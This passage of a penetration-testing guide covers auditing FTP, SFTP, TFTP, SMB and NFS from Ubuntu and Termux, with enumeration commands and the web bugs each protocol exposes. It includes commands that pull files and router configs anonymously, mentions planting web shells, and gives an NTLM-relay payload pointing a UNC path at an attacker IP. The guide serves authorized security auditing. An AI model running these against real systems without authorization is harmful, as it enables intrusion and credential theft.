### 2. Security Auditing & Web Vulnerabilities (Section 2: File Transfer & Sharing)

In authorized penetration testing and bug bounty hunting, file transfer protocols frequently bridge the gap to web application compromise by exposing web roots, leaking source code or backups, or enabling arbitrary file uploads.

#### Environment Differences: Ubuntu vs. Termux

* **Ubuntu:** Supports kernel-level mounting (`mount -t nfs`, `mount -t cifs`), raw UDP scanning (`nmap -sU` for TFTP), and native SMB/NFS client suites.
* **Termux:** Cannot mount network filesystems directly into the Android kernel without root. Auditors rely on user-space CLI clients (`ftp`, `sftp`, `smbclient`, `curl`) and Python-based enumeration tools (`impacket`, `enum4linux-ng`).

#### Protocol-by-Protocol Breakdown

##### 1. FTP (Ports 20, 21) & FTPS (Ports 989, 990)

* **How it is audited (Ubuntu & Termux):**
  * **Anonymous Access & Banner Checks:** Checking if `anonymous` login is enabled and inspecting the FTP server version (`vsftpd`, `ProFTPD`, `FileZilla`) for known vulnerabilities.
  * **Directory & Permission Enumeration:** Listing accessible directories and testing whether an authenticated or anonymous user can upload (`PUT`) or download (`GET`) files.
  * **Additional Auditing Commands:**
    ```bash
    # Check for anonymous login, bounce attacks, and server banners
    nmap -sT -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst <target>

    # Connect and test anonymous login via curl (works on Ubuntu & Termux)
    curl -v ftp://<target>/ --user anonymous:anonymous

    # Test FTPS (explicit TLS) connection and inspect SSL certificate
    openssl s_client -connect <target>:21 -starttls ftp

    # Mirror/download all accessible files recursively for offline audit
    wget -r --no-parent ftp://anonymous:anonymous@<target>/
    ```
* **Web Bugs Found:**
  * **Writable Web Root (RCE):** When the FTP directory maps directly to the web server's document root (`/var/www/html` or `inetpub/wwwroot`), uploading a `.php`, `.jsp`, or `.aspx` file results in immediate Remote Code Execution.
  * **Backup & Config Disclosure:** Discovering database dumps (`.sql`), `.env` files, or source code archives inside publicly readable FTP folders.
  * **FTP SSRF Pivoting:** Exploiting web SSRF vulnerabilities via `ftp://` URL wrappers to scan internal ports or interact with internal file servers.

##### 2. SFTP (Port 22)

* **How it is audited (Ubuntu & Termux):**
  * **Chroot & Path Traversal Checks:** Verifying whether SFTP users are properly jailed (`ChrootDirectory`) or if they can navigate up into `/etc/` or web application directories.
  * **Cryptographic & Key Audits:** Inheriting SSH security checks to verify weak ciphers or exposed key pairs.
  * **Additional Auditing Commands:**
    ```bash
    # Connect interactively using specific identity key
    sftp -i id_rsa user@<target>

    # Non-interactive directory listing via batch mode
    echo "ls -la /var/www/" | sftp -b - user@<target>

    # Audit underlying SSH/SFTP algorithms
    ssh-audit <target>
    ```
* **Web Bugs Found:**
  * **Leaked SFTP Deployment Credentials:** Modern CI/CD pipelines and web IDEs (e.g., VS Code `sftp.json` left inside `.vscode/` in a public web root) frequently leak SFTP hostnames, usernames, and passwords.
  * **Broken Chroot Isolation:** Compromising a low-privilege SFTP upload account and traversing out to read web application configuration files.

##### 3. TFTP (Port 69 - UDP)

* **How it is audited (Ubuntu & Termux):**
  * **Unauthenticated File Probing:** Because TFTP lacks authentication and directory listing (`ls`) features, auditors probe for predictable configuration filenames (e.g., `startup-config`, `router.cfg`).
  * **Additional Auditing Commands:**
    ```bash
    # Scan UDP port 69 on Ubuntu (requires root)
    sudo nmap -sU -p 69 --script tftp-enum <target>

    # Attempt to pull a configuration file using standard tftp client
    tftp <target> -c get startup-config

    # Pull a file via curl (works on Termux without root)
    curl -v tftp://<target>/startup-config -o startup-config
    ```
* **Web Bugs Found:**
  * **Network Appliance Web Credential Leaks:** Routers, VoIP phones, and switches often store their administrative web UI passwords and SNMP strings in plaintext inside TFTP-accessible boot files.

##### 4. SMB / CIFS (Port 445)

* **How it is audited (Ubuntu & Termux):**
  * **Null Session & Share Enumeration:** Querying exposed shares, user lists, and password policies without credentials, and checking SMB signing requirements.
  * **Additional Auditing Commands:**
    ```bash
    # Enumerate SMB shares, OS details, and signing status via Nmap
    nmap -sT -p 445 --script smb-enum-shares,smb-os-discovery,smb2-security-mode <target>

    # List available shares using null session (Ubuntu & Termux)
    smbclient -L //<target>/ -N

    # Connect to a specific readable/writable share
    smbclient //<target>/<share_name> -N

    # Comprehensive Python-based SMB/RPC enumeration (works on Ubuntu & Termux)
    enum4linux-ng -A <target>
    ```
* **Web Bugs Found:**
  * **NTLM Relay via Web XSS / SSRF:** Injecting a UNC path (`\\<attacker-ip>\payload` or `<img src="file://<attacker-ip>/x">`) into a vulnerable web app forces the server or victim browser to send NetNTLMv2 hashes over SMB for offline cracking or relaying.
  * **Exposed Web Application Shares:** Misconfigured `wwwroot` or backup shares accessible to `Everyone` or `Guest`, allowing direct source code theft or web shell placement.

##### 5. NFS (Port 2049)

* **How it is audited (Ubuntu & Termux):**
  * **Export Enumeration & Permission Checks:** Identifying exported directories and checking for `no_root_squash` or world-readable/writable flags (`*`).
  * **Additional Auditing Commands:**
    ```bash
    # List exported NFS shares and allowed IP ranges via Nmap
    nmap -sT -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>

    # Query exported shares directly (Ubuntu)
    showmount -e <target>

    # Mount an exposed NFS share locally on Ubuntu (requires root)
    sudo mkdir -p /mnt/nfs_audit
    sudo mount -t nfs -o nolock <target>:/exported/path /mnt/nfs_audit
    ```
* **Web Bugs Found:**
  * **Direct Web Root Access:** Developers frequently export `/var/www` over NFS for easy deployment; if left open to `0.0.0.0/0`, any external tester can mount the web root, read API secrets, or upload a web shell.
